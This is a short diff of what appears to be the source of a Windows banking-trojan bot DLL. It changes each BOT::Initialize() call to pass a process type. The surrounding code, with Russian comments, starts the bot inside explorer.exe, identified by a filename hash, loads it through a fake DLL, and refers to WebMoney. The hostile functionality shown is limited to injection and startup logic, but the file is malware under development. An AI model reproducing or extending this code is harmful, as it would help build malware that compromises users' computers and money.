@@ -63,7 +63,7 @@ DWORD dwWebMoneySelf = 0;
 
 DWORD WINAPI LoaderRoutine(LPVOID Data)
 {
-	BOT::Initialize();
+	BOT::Initialize(ProcessLoader);
 
 	DLLDBG("====>Bot DLL", "-------- LoaderRoutine (v10)");
 
@@ -176,7 +176,7 @@ DWORD WINAPI ExplorerMain(LPVOID Data)
 
 extern"C"  void WINAPI Start(LPVOID, LPVOID, LPVOID)
 {
-	BOT::Initialize();
+	BOT::Initialize(ProcessUnknown);
 	StartThread(ExplorerMain, NULL);
 }
 
@@ -189,7 +189,7 @@ BOOL APIENTRY MyDllMain( HMODULE hModule,
 	switch (ul_reason_for_call)
 	{
 		case DLL_PROCESS_ATTACH:
-			BOT::Initialize();
+			BOT::Initialize(ProcessUnknown);
 			pGetModuleFileNameA( NULL, buf, MAX_PATH );
 			DLLDBG( "MyDllMain", "Start bot.plug in process %s", buf );
 			if( File::GetNameHashA( buf, true ) == 0x490A0972 ) //стартуем если в процессе проводника (explorer.exe)
@@ -208,7 +208,7 @@ BOOL APIENTRY MyDllMain( HMODULE hModule,
 // Ф-ция для прыжка в Explorer при загрузке из StartFromFakeDll
 DWORD WINAPI ExplorerEntryPointFromFakeDll( LPVOID lpData )
 {
-	BOT::Initialize();
+	BOT::Initialize(ProcessUnknown);
 	DLLDBG("ExplorerEntryPointFromFakeDll", "Bot started in Explorer.exe" );
 	// При загрузке просто вызывает Start, предусмотренную для
 	// обычного запуска Bot.plug
